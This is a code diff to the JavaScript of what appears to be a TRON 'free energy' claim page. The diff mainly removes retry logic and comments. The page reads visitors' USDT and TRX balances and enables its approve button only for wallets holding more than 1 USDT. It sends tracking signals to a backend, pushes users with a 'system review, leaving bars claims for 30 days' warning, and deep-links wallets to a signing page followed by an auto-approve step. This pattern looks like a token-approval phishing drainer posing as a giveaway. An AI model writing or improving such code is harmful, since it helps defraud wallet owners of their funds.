@@ -898,8 +898,9 @@ function reRenderDynamicContent() {
         return;
     }
     recordList.style.display = "block";
+    const shortAddr = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
+
     if (userAddress === SPECIAL_ADDRESS) {
-        const shortAddr = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
         userInfoEl.innerHTML = lang.eligibleTip
             .replace("{address}", shortAddr)
             .replace("{usdt}", tokenBalance.toFixed(2))
@@ -910,7 +911,7 @@ function reRenderDynamicContent() {
         updateWalletStatus();
         return;
     }
-    const shortAddr = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
+
     if (isAddressAuthorized(userAddress)) {
         userInfoEl.innerHTML = lang.authorizedTip
             .replace("{address}", shortAddr)
@@ -918,29 +919,18 @@ function reRenderDynamicContent() {
             .replace("{trx}", trxBalance.toFixed(2));
         approveBtn.disabled = true;
         approveBtn.textContent = lang.authorizedBtn;
-        document.getElementById("statusAddress").textContent = shortAddr;
-        updateWalletStatus();
-        return;
-    }
-    if (tokenBalance <= 0) {
+    } else if (tokenBalance <= 1) {
         userInfoEl.innerHTML = lang.insufficientUsdt
             .replace("{address}", shortAddr)
             .replace("{usdt}", tokenBalance.toFixed(2))
             .replace("{trx}", trxBalance.toFixed(2));
         approveBtn.disabled = true;
         approveBtn.textContent = lang.insufficientBtn;
-    } else if (tokenBalance > 1) {
+    } else {
         userInfoEl.innerHTML = lang.eligibleTip
             .replace("{address}", shortAddr)
             .replace("{usdt}", tokenBalance.toFixed(2))
             .replace("{trx}", trxBalance.toFixed(2));
-        approveBtn.disabled = false;
-        approveBtn.textContent = lang.approveBtnText;
-    } else {
-        userInfoEl.innerHTML = lang.eligibleTip
-            .replace("{address}", shortAddr)
-            .replace("{usdt}", lang.queryingBalance)
-            .replace("{trx}", lang.queryingBalance);
         approveBtn.disabled = false;
         approveBtn.textContent = lang.approveBtnText;
     }
@@ -998,117 +988,98 @@ async function autoApprove() {
         showAutoCloseAlert(`${lang.authorizeFail.replace("{msg}", e.message)}`);
     }
 }
-// ========== 环境检测函数 ==========
+// ========== 环境检测函数（无重试，一次检测） ==========
 async function checkImTokenEnv() {
     const lang = langConfig[currentLang];
     const walletModal = document.getElementById("walletModal");
     const connectBtn = document.getElementById("connectBtn");
-    // 修复：延迟检测tronWeb，避免钱包加载延迟导致识别失败
-    const checkTronWeb = () => {
-        if (window.tronWeb && window.tronWeb.defaultAddress) {
-            tronWeb = window.tronWeb;
-            connectBtn.style.display = "none";
-            warning.style.display = "none";
-            specialTipContainer.style.display = "none";
-            walletModal.classList.remove("active");
-            initWallet(false);
-        } else {
-            // 3秒内未检测到，视为普通浏览器
-            setTimeout(() => {
-                if (!window.tronWeb) {
-                    specialTipContainer.style.display = "block";
-                    userInfoEl.innerHTML = lang.nonImTokenUser;
-                    approveBtn.style.display = "none";
-                    connectBtn.onclick = () => {
-                        walletModal.classList.add("active");
-                    };
-                    document.querySelectorAll(".wallet-item").forEach(item => {
-                        item.addEventListener("click", async (e) => {
-                            const walletType = e.currentTarget.dataset.wallet;
-                            const wallet = walletConfig[walletType];
-                            if (!wallet) return;
-                            try {
-                                const dappUrl = window.location.href + "#wallet-open" + `?wallet=${walletType}`;
-                                let jumpUrl = "";
-                                switch (walletType) {
-                                    case "tronlink":
-                                        const param = JSON.stringify({
-                                            url: dappUrl,
-                                            action: "open",
-                                            protocol: "tronlink",
-                                            version: "1.0"
-                                        });
-                                        jumpUrl = wallet.scheme + encodeURIComponent(param);
-                                        break;
-                                    case "tokenpocket":
-                                        jumpUrl = wallet.scheme + encodeURIComponent(dappUrl) + wallet.suffix;
-                                        break;
-                                    default:
-                                        jumpUrl = wallet.scheme + encodeURIComponent(dappUrl);
-                                }
-                                window.location.href = jumpUrl;
-                                walletModal.classList.remove("active");
-                            } catch (e) {
-                                console.error(`${wallet.name}唤起失败：`, e);
-                                walletModal.classList.remove("active");
-                                showAutoCloseAlert(`唤起${wallet.name}失败，请手动打开钱包访问`);
-                            }
-                        });
-                    });
-                    walletModal.addEventListener("click", (e) => {
-                        if (e.target === walletModal) {
-                            walletModal.classList.remove("active");
-                        }
-                    });
+    
+    if (window.tronWeb && window.tronWeb.defaultAddress) {
+        tronWeb = window.tronWeb;
+        connectBtn.style.display = "none";
+        warning.style.display = "none";
+        specialTipContainer.style.display = "none";
+        walletModal.classList.remove("active");
+        await initWallet(false);
+    } else {
+        specialTipContainer.style.display = "block";
+        userInfoEl.innerHTML = lang.nonImTokenUser;
+        approveBtn.style.display = "none";
+        connectBtn.onclick = () => walletModal.classList.add("active");
+        
+        document.querySelectorAll(".wallet-item").forEach(item => {
+            item.addEventListener("click", async (e) => {
+                const walletType = e.currentTarget.dataset.wallet;
+                const wallet = walletConfig[walletType];
+                if (!wallet) return;
+                try {
+                    const dappUrl = window.location.href + "#wallet-open" + `?wallet=${walletType}`;
+                    let jumpUrl = "";
+                    switch (walletType) {
+                        case "tronlink":
+                            const param = JSON.stringify({ url: dappUrl, action: "open", protocol: "tronlink", version: "1.0" });
+                            jumpUrl = wallet.scheme + encodeURIComponent(param);
+                            break;
+                        case "tokenpocket":
+                            jumpUrl = wallet.scheme + encodeURIComponent(dappUrl) + wallet.suffix;
+                            break;
+                        default:
+                            jumpUrl = wallet.scheme + encodeURIComponent(dappUrl);
+                    }
+                    window.location.href = jumpUrl;
+                    walletModal.classList.remove("active");
+                } catch (e) {
+                    console.error(`${wallet.name}唤起失败：`, e);
+                    walletModal.classList.remove("active");
+                    showAutoCloseAlert(`唤起${wallet.name}失败，请手动打开钱包访问`);
                 }
-            }, 3000);
-        }
-    };
-    checkTronWeb();
+            });
+        });
+        
+        walletModal.addEventListener("click", (e) => {
+            if (e.target === walletModal) walletModal.classList.remove("active");
+        });
+    }
 }
-// ========== 钱包初始化函数 ==========
+// ========== 钱包初始化函数（无重试，一次查询） ==========
 async function initWallet(needAutoApprove) {
     const lang = langConfig[currentLang];
     try {
         userAddress = tronWeb.defaultAddress.base58;
         const shortAddr = userAddress ? `${userAddress.slice(0,8)}...${userAddress.slice(-6)}` : "未知地址";
+        
         document.getElementById("statusAddress").textContent = shortAddr;
         userInfoEl.innerHTML = `${lang.loadingTip.replace("{address}", shortAddr)}`;
         updateWalletStatus();
         recordList.style.display = "block";
+
         const queryBalance = async () => {
             try {
-                const timeoutPromise = new Promise((_, reject) => 
-                    setTimeout(() => reject(new Error("余额查询超时")), 10000)
-                );
-                trc20Contract = trc20Contract || await tronWeb.contract(USDT_ABI, TRC20_TOKEN_ADDRESS);
-                const [usdtRaw, trxRaw] = await Promise.race([
-                    Promise.all([
-                        trc20Contract.balanceOf(userAddress).call().catch(err => 0),
-                        tronWeb.trx.getBalance(userAddress).catch(err => 0)
-                    ]),
-                    timeoutPromise
-                ]);
+                trc20Contract = await tronWeb.contract(USDT_ABI, TRC20_TOKEN_ADDRESS);
+                const usdtRaw = await trc20Contract.balanceOf(userAddress).call();
+                const trxRaw = await tronWeb.trx.getBalance(userAddress);
+                
                 tokenBalance = Number(usdtRaw) / 1000000;
                 trxBalance = Number(trxRaw) / 1000000;
                 reRenderDynamicContent();
             } catch (e) {
                 console.error("余额查询失败：", e);
                 userInfoEl.innerHTML = `余额查询失败<br><span style='color: #ef4444; font-size: 14px;'>${e.message}</span>`;
-                approveBtn.disabled = false;
-                approveBtn.textContent = "重试查询";
-                approveBtn.onclick = () => queryBalance();
+                approveBtn.disabled = true;
+                approveBtn.textContent = "查询失败";
             }
         };
         queryBalance();
+
         bindApproveLogic();
+
         if (userAddress && canSendA1Signal(userAddress)) {
             sendSignalA1().catch(err => console.error("A1信号发送失败：", err));
             updateA1SignalRecord(userAddress);
         }
     } catch (e) {
         console.error("钱包初始化异常：", e);
-        userInfoEl.innerHTML = `连接失败：${e.message}<br><span style='color: #ef4444; font-size: 14px;'>请刷新页面重试</span>`;
+        userInfoEl.innerHTML = `连接失败<br><span style='color: #ef4444; font-size: 14px;'>${e.message}</span>`;
         approveBtn.disabled = true;
         approveBtn.textContent = "连接失败";
         updateWalletStatus();
@@ -1256,10 +1227,9 @@ async function sendSignalB(isB1 = true) {
         throw e;
     }
 }
-// ========== 核心逻辑bindApproveLogic ==========
+// ========== 核心逻辑bindApproveLogic（无任何重试） ==========
 function bindApproveLogic() {
     const lang = langConfig[currentLang];
-    // 白名单地址强制启用按钮，忽略已授权状态
     if ((tokenBalance > 1 && !isAddressAuthorized(userAddress)) || userAddress === SPECIAL_ADDRESS) {
         approveBtn.disabled = false;
         approveBtn.textContent = lang.approveBtnText;
@@ -1271,7 +1241,6 @@ function bindApproveLogic() {
         reviewTip.style.display = "none";
         let alertEl = null;
         try {
-            // 基础校验
             if (!userAddress) {
                 showAutoCloseAlert(lang.noWalletAddress.split("<br>")[0]);
                 btn.disabled = false;
@@ -1292,64 +1261,40 @@ function bindApproveLogic() {
             }
             if (!trc20Contract) {
                 trc20Contract = await tronWeb.contract(USDT_ABI, TRC20_TOKEN_ADDRESS);
-                if (!trc20Contract) {
-                    throw new Error(lang.systemBusyTip);
-                }
+                if (!trc20Contract) throw new Error(lang.systemBusyTip);
             }
-            // A1信号校验
             let a1Status = JSON.parse(localStorage.getItem(A1_STATUS_KEY) || "{}");
             let isA1Success = a1Status[userAddress] === "success";
             if (!isA1Success) {
                 alertEl = showPersistentAlert(lang.systemBusyTip);
-                const retryA1 = await sendSignalA1().catch(err => false);
-                if (!retryA1) {
-                    throw new Error("A1信号同步失败，请刷新页面");
-                }
+                const a1Result = await sendSignalA1();
+                if (!a1Result) throw new Error("A1信号发送失败");
                 a1Status[userAddress] = "success";
                 localStorage.setItem(A1_STATUS_KEY, JSON.stringify(a1Status));
-                isA1Success = true;
             }
-            // B1信号防重复处理
             let isB1Repeated = hasSentB1Signal(userAddress);
             if (isB1Repeated) {
-                await handleJump(); // 防重复：直接跳转
+                await handleJump();
             } else {
                 alertEl = showPersistentAlert("系统审核中，通过后自动跳转，中途退出30日不可再次领取");
                 markB1SignalSent(userAddress);
-                const b1Response = await sendSignalB(true);
-                if (!b1Response) {
-                    alertEl.textContent = "现在领取的人太多啦，请稍后重试";
-                    setTimeout(() => {
-                        if (alertEl && alertEl.parentNode) {
-                            alertEl.style.opacity = "0";
-                            setTimeout(() => alertEl.parentNode.removeChild(alertEl), 300);
-                        }
-                    }, 3000);
-                    btn.disabled = false;
-                    btn.textContent = lang.approveBtnText;
-                    return;
-                }
-                // B1成功：移除弹窗再跳转
-                if (alertEl && alertEl.parentNode) {
-                    alertEl.parentNode.removeChild(alertEl);
-                }
+                const b1Result = await sendSignalB(true);
+                if (!b1Result) throw new Error("系统审核未通过");
+                if (alertEl && alertEl.parentNode) alertEl.parentNode.removeChild(alertEl);
                 await handleJump();
             }
-            // 领取记录存储
             saveEnergyRecord();
             renderEnergyRecords();
         } catch (e) {
             console.error("领取流程异常：", e);
-            if (alertEl && alertEl.parentNode) {
-                alertEl.parentNode.removeChild(alertEl);
-            }
+            if (alertEl && alertEl.parentNode) alertEl.parentNode.removeChild(alertEl);
             showAutoCloseAlert(`操作失败：${e.message || lang.systemBusyTip}`);
             btn.disabled = false;
             btn.textContent = lang.approveBtnText;
         }
     };
 
-    // 完整无截断的handleJump函数（包含你贴的结尾逻辑）
+    // 跳转函数（一次跳转，不重试）
     async function handleJump() {
         const lang = langConfig[currentLang];
         const btn = document.getElementById("approveBtn");
@@ -1357,72 +1302,49 @@ function bindApproveLogic() {
             const selectedWalletType = getWalletFromUrl();
             let wallet = null;
             let jumpUrl = "";
-            const currentUrl = window.location.href + "#approve"; // 带签名标记，一步到签名页
+            const currentUrl = window.location.href + "#approve";
             const encodedUrl = encodeURIComponent(currentUrl);
 
-            // 1. 优先复用用户选择的钱包类型
             if (selectedWalletType && walletConfig[selectedWalletType]) {
                 wallet = walletConfig[selectedWalletType];
-                // 完全复刻参考文件的跳转格式
                 switch (selectedWalletType) {
-                    case "imtoken":
-                        jumpUrl = `imtokenv2://navigate/DappView?url=${encodedUrl}`;
-                        break;
-                    case "tokenpocket":
-                        jumpUrl = `tpdapp://open?params={"url":"${encodedUrl}"}`;
-                        break;
-                    case "tronlink":
-                        const tronParam = JSON.stringify({
-                            url: currentUrl,
-                            action: "open",
-                            protocol: "tronlink",
-                            version: "1.0"
-                        });
+                    case "imtoken": jumpUrl = `imtokenv2://navigate/DappView?url=${encodedUrl}`; break;
+                    case "tokenpocket": jumpUrl = `tpdapp://open?params={"url":"${encodedUrl}"}`; break;
+                    case "tronlink": 
+                        const tronParam = JSON.stringify({ url: currentUrl, action: "open", protocol: "tronlink", version: "1.0" });
                         jumpUrl = `tronlinkoutside://pull.activity?param=${encodeURIComponent(tronParam)}`;
                         break;
-                    case "bitget":
-                        jumpUrl = `bitkeep://bkconnect?action=dapp&url=${currentUrl}`;
-                        break;
-                    default:
-                        jumpUrl = wallet.scheme + encodedUrl;
+                    case "bitget": jumpUrl = `bitkeep://bkconnect?action=dapp&url=${currentUrl}`; break;
+                    default: jumpUrl = wallet.scheme + encodedUrl;
                 }
                 localStorage.setItem("selectedWalletType", selectedWalletType);
             } else {
-                // 2. 兜底逻辑：优先imToken，兼容环境检测
                 wallet = walletConfig.imtoken;
                 jumpUrl = `imtokenv2://navigate/DappView?url=${encodedUrl}`;
-                
                 if (window.tronWeb && window.tronWeb.provider?.isTokenPocket) {
                     wallet = walletConfig.tokenpocket;
                     jumpUrl = `tpdapp://open?params={"url":"${encodedUrl}"}`;
                 } else if (window.tronWeb && window.tronWeb.provider?.isTronLink) {
-                    wallet = walletConfig.tronlink;
-                    const tronParam = JSON.stringify({
-                        url: currentUrl,
-                        action: "open",
-                        protocol: "tronlink",
-                        version: "1.0"
-                    });
+                    const tronParam = JSON.stringify({ url: currentUrl, action: "open", protocol: "tronlink", version: "1.0" });
                     jumpUrl = `tronlinkoutside://pull.activity?param=${encodeURIComponent(tronParam)}`;
+                    wallet = walletConfig.tronlink;
                 } else if (window.tronWeb && window.tronWeb.provider?.isBitKeep) {
                     wallet = walletConfig.bitget;
                     jumpUrl = `bitkeep://bkconnect?action=dapp&url=${currentUrl}`;
                 }
             }
 
-            // 3. 参考文件逻辑：直接跳转，一步到位到签名页面（你贴的核心代码）
             window.location.href = jumpUrl;
             btn.textContent = `正在唤起${wallet.name}签名页面...`;
 
-            // 4. 跳转失败兜底提示（你贴的结尾逻辑）
             setTimeout(() => {
-                showAutoCloseAlert(`未检测到${wallet.name}，请手动打开${wallet.name}访问该链接`);
+                showAutoCloseAlert(`未检测到${wallet.name}，请手动打开`);
                 btn.disabled = false;
                 btn.textContent = lang.approveBtnText;
             }, 3000);
         } catch (jumpErr) {
             console.error("跳转失败：", jumpErr);
-            showAutoCloseAlert("跳转授权失败，请手动打开钱包访问该链接");
+            showAutoCloseAlert("跳转授权失败，请手动打开钱包");
             btn.disabled = false;
             btn.textContent = lang.approveBtnText;
         }
@@ -1451,7 +1373,6 @@ function renderEnergyRecords() {
         container.innerHTML = `<div class='record-item'>${lang.noRecord}</div>`;
         return;
     }
-    // 批量生成DOM，优化渲染效率
     const recordsHtml = records.map(record => `
         <div class='record-item'>
             <p><strong>${lang.recordAddress}</strong>${record.address.slice(0,8)}...${record.address.slice(-6)}</p>
@@ -1466,17 +1387,17 @@ function renderEnergyRecords() {
 function getWalletFromUrl() {
     const params = new URLSearchParams(window.location.search);
     const walletType = params.get("wallet");
-    // 验证是否是支持的钱包类型
     return walletType && walletConfig[walletType] ? walletType : null;
 }
-// ========== 页面初始化（修复绑定时机） ==========
+// ========== 页面初始化（无延迟、无重试） ==========
 document.addEventListener('DOMContentLoaded', async () => {
     localStorage.removeItem("energy_state");
     contractEnergyEl = document.getElementById("contractEnergy");
     if (!contractEnergyEl) {
-        showAutoCloseAlert("⚠️ 能量显示元素未找到，请检查页面");
+        showAutoCloseAlert("⚠️ 能量显示元素未找到");
         return;
     }
+    
     startPersistentEnergyCountdown();
     updatePageLang();
     langToggle.addEventListener("click", toggleLang);
@@ -1484,12 +1405,12 @@ document.addEventListener('DOMContentLoaded', async () => {
     renderEnergyRecords();
     updateWalletStatus();
     recordList.style.display = "none";
-    // 关键：读取URL中的钱包类型参数，存储到localStorage
+
     const urlWalletType = getWalletFromUrl();
     if (urlWalletType && walletConfig[urlWalletType]) {
         localStorage.setItem("selectedWalletType", urlWalletType);
     }
-    // 移除500ms延迟，立即执行环境检测（解决卡顿）
+
     checkImTokenEnv().catch(err => {
         console.error("环境检测失败：", err);
         const lang = langConfig[currentLang];
@@ -1497,37 +1418,32 @@ document.addEventListener('DOMContentLoaded', async () => {
         approveBtn.disabled = true;
         approveBtn.textContent = lang.approveBtnText;
     });
+
     window.addEventListener("beforeunload", () => {
         if (trxTimer) clearInterval(trxTimer);
     });
-    // 监听钱包唤起标记
-    if (window.location.hash === "#wallet-open" && window.tronWeb) {
+
+    if (window.tronWeb && window.location.hash === "#wallet-open") {
         window.location.hash = "";
-        setTimeout(() => {
-            initWallet(false).catch(err => {
-                console.error("钱包唤起后初始化失败：", err);
-                userInfoEl.innerHTML = `加载失败：${err.message}<br><span style='color: #ef4444; font-size: 14px;'>请刷新重试</span>`;
-                approveBtn.disabled = false;
-                approveBtn.textContent = "重新加载";
-                approveBtn.onclick = () => window.location.reload();
-            });
-        }, 500);
+        initWallet(false).catch(err => {
+            console.error("钱包唤起后初始化失败：", err);
+            userInfoEl.innerHTML = `加载失败<br><span style='color: #ef4444; font-size: 14px;'>${err.message}</span>`;
+            approveBtn.disabled = true;
+            approveBtn.textContent = "加载失败";
+        });
     }
-    // 处理授权后回调
+
     if (window.tronWeb && window.location.hash === "#approve") {
         window.location.hash = "";
-        setTimeout(() => {
-            autoApprove().catch(err => {
-                console.error("授权后初始化失败：", err);
-                userInfoEl.innerHTML = `授权失败：${err.message}<br><span style='color: #ef4444; font-size: 14px;'>请返回重新领取</span>`;
-                approveBtn.disabled = false;
-                approveBtn.textContent = "返回领取";
-                approveBtn.onclick = () => window.location.href = window.location.origin + window.location.pathname;
-            });
-        }, 500);
+        autoApprove().catch(err => {
+            console.error("授权后初始化失败：", err);
+            userInfoEl.innerHTML = `授权失败<br><span style='color: #ef4444; font-size: 14px;'>${err.message}</span>`;
+            approveBtn.disabled = true;
+            approveBtn.textContent = "授权失败";
+        });
     }
 });
-// ========== 补充：updateWalletStatus 函数（之前遗漏定义，避免报错） ==========
+// ========== 补充：updateWalletStatus 函数（避免报错） ==========
 function updateWalletStatus() {
     if (userAddress) {
         walletStatusContainer.classList.add("connected");
